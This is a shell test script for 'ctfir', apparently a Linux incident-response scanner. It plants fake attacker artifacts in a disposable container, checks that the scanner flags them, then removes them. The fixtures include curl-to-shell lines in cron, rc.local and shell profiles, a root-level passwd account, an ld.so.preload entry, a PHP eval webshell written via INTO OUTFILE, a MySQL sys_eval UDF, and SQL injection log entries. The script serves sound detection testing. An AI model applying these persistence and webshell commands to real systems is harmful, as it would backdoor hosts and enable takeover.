#!/bin/sh
# ctfir Linux 集成夹具测试（在一次性容器内以 root 运行）
# 正例夹具全部 ctfir-marker 前缀；阶段3 清理并复验。容器即弃，宿主无残留。
# 用法: sh fixture_linux.sh /tmp/build/ctfir
BIN="$1"
[ -x "$BIN" ] || { echo "usage: $0 <ctfir-binary>"; exit 2; }
OUT=/tmp/ctfir-fixtest
pass=0; fail=0
ok()  { pass=$((pass+1)); echo "[PASS] $1"; }
bad() { fail=$((fail+1)); echo "[FAIL] $1"; }
has_rule()  { grep -q "$1" "$OUT/findings.json" 2>/dev/null && ok "rule $1 present" || bad "rule $1 MISSING"; }
no_rule()   { grep -q "$1" "$OUT/findings.json" 2>/dev/null && bad "rule $1 should be ABSENT" || ok "rule $1 absent"; }
has_text()  { grep -q "$1" "$OUT/$2" 2>/dev/null && ok "$2 contains '$1'" || bad "$2 missing '$1'"; }

echo "=== 阶段1：负例（干净容器基线）==="
rm -rf "$OUT"
"$BIN" scan --out "$OUT" > /dev/null 2>&1
echo "clean scan exit=$?"
no_rule LNX.ACC.UID0.001
no_rule LNX.PERSIST.PRELOAD.001
no_rule LNX.PERSIST.CRON.001
no_rule LNX.PERSIST.PROFILE.001
no_rule LNX.TRACE.HISTORY.001
grep -q ctfir-marker "$OUT/findings.json" 2>/dev/null && bad "clean scan has marker" || ok "clean scan no marker"
# 发行版原生 SUID（debian 8 等）不作为干净基线失败
no_rule LNX.PERSIST.SYSTEMD.001
no_rule LNX.PERSIST.SSHLOG.001
no_rule LNX.WEB.LOGATTACK.001
# 注：容器 /etc/hosts 含 docker 注入的主机名行，HOSTS.MAP 属预期命中，不做负例断言

echo "=== 阶段2：正例夹具（全部 ctfir-marker 前缀）==="
mkdir -p /etc/cron.d /etc/profile.d /etc/systemd/system /root/.ssh /usr/bin
echo 'ctfir-marker:x:0:0:marker:/tmp:/bin/sh' >> /etc/passwd
echo '* * * * * root curl http://127.0.0.1/ctfir-marker | sh' > /etc/cron.d/ctfir-marker
echo '/tmp/ctfir-marker-evil.so' > /etc/ld.so.preload
echo '10.66.0.66 ctfir-marker.local' >> /etc/hosts
echo 'alias ls="curl http://127.0.0.1/ctfir-marker | sh"' > /etc/profile.d/ctfir-marker.sh
echo 'alias ls="curl http://127.0.0.1/ctfir-marker | sh"' > /etc/profile.d/ctfir-marker.sh
echo 'wget http://127.0.0.1/ctfir-marker.sh -O /tmp/ctfir-marker-evil.sh' > /root/.bash_history
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarker ctfir-marker@test' > /root/.ssh/authorized_keys
printf "#!/bin/sh\nexit 0\n" > /usr/bin/ctfir-marker-suid && chmod 4755 /usr/bin/ctfir-marker-suid
printf '[Service]\nExecStart=/tmp/ctfir-marker-evil.sh\n' > /etc/systemd/system/ctfir-marker.service
# v0.6: SSHLOG + 宝塔日志攻击特征
printf 'ctfir-marker : (redacted)\n' > /tmp/.sshlog
mkdir -p /www/wwwlogs /var/log/mysql /var/lib/mysql
i=0; while [ $i -lt 60 ]; do echo '10.88.88.88 - - [12/Nov/2026:10:00:00 +0800] "POST /ctfir-marker.php HTTP/1.1" 200 -' >> /www/wwwlogs/ctfir-marker.com.log; i=$((i+1)); done
echo '10.88.88.88 - - [12/Nov/2026:10:01:00 +0800] "GET /index.php?id=1%20UNION%20SELECT%201,2,3 HTTP/1.1" 200 12 "-" "sqlmap/1.7"' >> /www/wwwlogs/ctfir-marker.com.log
echo '10.88.88.88 - - [12/Nov/2026:10:02:00 +0800] "GET /static/../../etc/passwd HTTP/1.1" 200 - "-" "Mozilla/5.0"' >> /www/wwwlogs/ctfir-marker.com.log
printf '# Time: 2026-11-12\nSELECT "<?php eval(\$_POST[1]);?>" INTO OUTFILE "/var/www/html/ctfir-marker-slow.php";\n' > /var/log/mysql/mysql-slow.log
printf 'Query\tCREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so"\n' > /var/lib/mysql/mysql-bin.000001
# --- 原 manual 用例自动化：L06/L10/L16/L18/L22/L23/L27/L32/L34/L35/L48 ---
mkdir -p /etc/ssh /etc/ld.so.conf.d /etc/nginx /tmp/ctfir-baseline /var/log
# L06 shadow group-readable (save mode, set 0640; world bit off so group 分支命中)
SHADOW_MODE=$(stat -c %a /etc/shadow 2>/dev/null || echo 000)
echo "$SHADOW_MODE" > /tmp/ctfir-shadow-mode.bak
chmod 0640 /etc/shadow 2>/dev/null || true
# L10 PermitRootLogin yes
if [ -f /etc/ssh/sshd_config ]; then cp /etc/ssh/sshd_config /tmp/ctfir-sshd.bak; fi
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
# L16 rc.local
echo 'curl http://127.0.0.1/ctfir-marker | sh' > /etc/rc.local
# L18 ld.so.conf.d 非常规路径
echo "/tmp/ctfir-marker-lib" > /etc/ld.so.conf.d/ctfir-marker.conf
# L22 已删除可执行文件仍在运行（busybox 需 exec -a；dash 不支持 -a，直接跑真正的 sleep ELF）
SLEEPBIN=$(command -v sleep)
if [ -x /bin/busybox ] && { [ "$(readlink "$SLEEPBIN" 2>/dev/null)" = "busybox" ] || [ "$(readlink "$SLEEPBIN" 2>/dev/null)" = "/bin/busybox" ]; }; then
  cp -f /bin/busybox /tmp/ctfir-marker-del
  chmod +x /tmp/ctfir-marker-del
  if [ -x /bin/busybox ]; then /bin/busybox ash -c 'exec -a sleep /tmp/ctfir-marker-del 90' &
  elif [ -x /bin/bash ]; then /bin/bash -c 'exec -a sleep /tmp/ctfir-marker-del 90' &
  fi
else
  cp -f "$SLEEPBIN" /tmp/ctfir-marker-del
  chmod +x /tmp/ctfir-marker-del
  /tmp/ctfir-marker-del 90 &
fi
sleep 0.4
rm -f /tmp/ctfir-marker-del
# L23 矿池命令行：必须让 shell 本身保持为进程（sleep 会被 exec 掉从而丢掉 token 参数）
/bin/sh -c 'sleep 90; true' 'stratum+tcp://ctfir-marker.example:3333' &

# L27 auth 失败 Top IP（20+）
i=0; while [ $i -lt 22 ]; do
  echo "Nov 12 10:00:00 alpine sshd[1]: Failed password for root from 10.66.66.66 port 22 ssh2" >> /var/log/auth.log
  i=$((i+1))
done
# L32 nginx root 定位
mkdir -p /var/www/html /usr/share/nginx/html
printf 'server { root /var/www/html; }\n' > /etc/nginx/nginx.conf
# L34 基线缺失 + L35 双扩展名
echo "original" > /tmp/ctfir-baseline/a.txt
echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef  missing-ctfir-marker.txt" > /tmp/ctfir-baseline.list
sha256sum /tmp/ctfir-baseline/a.txt | sed "s| /tmp/ctfir-baseline/||" >> /tmp/ctfir-baseline.list
printf 'MZ' > /tmp/ctfir-baseline/invoice.pdf.exe
# L48 正常 SELECT 不应触发 SLOWLOG（独立文件名）
printf "# Time: 2026-11-12\nSELECT id, name FROM users WHERE id=1;\n" > /var/log/mysql/mysql-slow-normal.log


rm -rf "$OUT"
"$BIN" scan --out "$OUT" --baseline /tmp/ctfir-baseline.list --dir /tmp/ctfir-baseline > /dev/null 2>&1
echo "fixture scan exit=$?"
has_rule LNX.ACC.UID0.001
has_rule LNX.PERSIST.CRON.001
has_rule LNX.PERSIST.PRELOAD.001
has_rule LNX.HOSTS.MAP.001
has_rule LNX.PERSIST.PROFILE.001
has_rule LNX.TRACE.HISTORY.001
has_rule LNX.SSH.AUTHKEY.001
has_rule LNX.SUID.UNEXPECTED.001
has_rule LNX.PERSIST.SYSTEMD.001
has_rule LNX.PERSIST.SSHLOG.001
has_rule LNX.WEB.LOGPOST.001
has_rule LNX.WEB.LOGATTACK.001
has_rule MID.MYSQL.SLOWLOG.001
has_rule MID.MYSQL.BINLOG.001
has_rule LNX.ACC.SHADOWPERM.001
has_rule LNX.SSH.CONFIG.001
has_rule LNX.PERSIST.RCLOCAL.001
has_rule LNX.LDSO.INJECT.001
has_rule LNX.PROC.DELETED.001
has_rule LNX.PROC.MINER.001
has_rule LNX.LOG.AUTHFAIL.001
has_rule LNX.FILES.BASELINE.MISS.001
has_rule LNX.FILES.DOUBLEEXT.001
# L32 nginx 根：证据或模块记录含 www
(grep -q "/var/www" "$OUT/evidence.json" "$OUT/module-results.json" 2>/dev/null) && ok "L32 nginx/web root located" || bad "L32 web root not in evidence"
# L48 正常 SELECT 文件不得出现在 SLOWLOG object_ref
grep -q "mysql-slow-normal" "$OUT/findings.json" && bad "L48 normal SELECT false positive" || ok "L48 normal SELECT not flagged"
has_text ctfir-marker.local findings.json
# HTML 报告产物 + 无脚本外链
[ -f "$OUT/report.html" ] && ok "report.html exists" || bad "report.html missing"
grep -qi "http://\|https://" "$OUT/report.html" && bad "html has external URL" || ok "html no external URLs"

echo "=== 阶段3：清理并复验 ==="
rm -f /etc/cron.d/ctfir-marker /etc/profile.d/ctfir-marker.sh \
      /etc/systemd/system/ctfir-marker.service /usr/bin/ctfir-marker-suid \
      /tmp/.sshlog /www/wwwlogs/ctfir-marker.com.log \
      /var/log/mysql/mysql-slow.log /var/lib/mysql/mysql-bin.000001 /var/log/mysql/mysql-slow-normal.log /etc/rc.local /etc/ld.so.conf.d/ctfir-marker.conf /etc/nginx/nginx.conf /var/log/auth.log
rmdir /www/wwwlogs /www /var/log/mysql 2>/dev/null || true
rm -f /etc/ld.so.preload
# /etc/hosts 是 docker bind-mount（rename 会 EBUSY）→ 用覆写而非 sed -i
grep -v ctfir-marker /etc/hosts > /tmp/hosts.clean 2>/dev/null && cat /tmp/hosts.clean > /etc/hosts
sed -i '/ctfir-marker/d' /etc/passwd /root/.bash_history /root/.ssh/authorized_keys
rmdir /root/.ssh 2>/dev/null || true
# 恢复 shadow 权限与 sshd_config；杀掉夹具进程
if [ -f /tmp/ctfir-shadow-mode.bak ]; then chmod "$(cat /tmp/ctfir-shadow-mode.bak)" /etc/shadow 2>/dev/null; rm -f /tmp/ctfir-shadow-mode.bak; fi
if [ -f /tmp/ctfir-sshd.bak ]; then cp /tmp/ctfir-sshd.bak /etc/ssh/sshd_config; rm -f /tmp/ctfir-sshd.bak; else sed -i "/PermitRootLogin yes/d" /etc/ssh/sshd_config 2>/dev/null || true; fi
for pd in /proc/[0-9]*; do
  cmd=$(tr "\0" " " < "$pd/cmdline" 2>/dev/null)
  case "$cmd" in *ctfir-marker*) kill -9 "${pd##*/}" 2>/dev/null ;; esac
  rl=$(readlink "$pd/exe" 2>/dev/null)
  case "$rl" in *ctfir-marker-del*) kill -9 "${pd##*/}" 2>/dev/null ;; esac
done
rm -rf /tmp/ctfir-baseline /tmp/ctfir-baseline.list
rmdir /etc/ld.so.conf.d 2>/dev/null || true
rmdir /etc/nginx 2>/dev/null || true

rm -rf "$OUT-clean"
"$BIN" scan --out "$OUT-clean" > /dev/null 2>&1
grep -q "ctfir-marker" "$OUT-clean/findings.json" && bad "marker residue after cleanup" || ok "cleanup verified"

echo "=== 阶段4：fault 例（nobody 低权限 → 权限失败不 PASS）==="
mkdir -p /tmp/nb-out && chmod 777 /tmp/nb-out
su -s /bin/sh nobody -c "$BIN scan --out /tmp/nb-out" > /dev/null 2>&1
nb_exit=$?
echo "nobody scan exit=$nb_exit"
[ "$nb_exit" = "2" ] && ok "low-privilege exit=2 (restricted)" || bad "low-privilege exit=$nb_exit (expect 2)"
grep -q "PERMISSION_DENIED" /tmp/nb-out/module-results.json && ok "PERMISSION_DENIED present" || bad "no PERMISSION_DENIED"
DENIED=$(grep -o '"status":"PERMISSION_DENIED"' /tmp/nb-out/module-results.json | wc -l)
[ "$DENIED" -ge 1 ] && ok "denied modules=$DENIED" || bad "denied modules=0"
grep -q '"overall_status": "PARTIAL"' /tmp/nb-out/session.json && ok "overall PARTIAL" || bad "overall not PARTIAL"
rm -rf /tmp/nb-out

echo "=== 结果: pass=$pass fail=$fail ==="
[ "$fail" -eq 0 ]
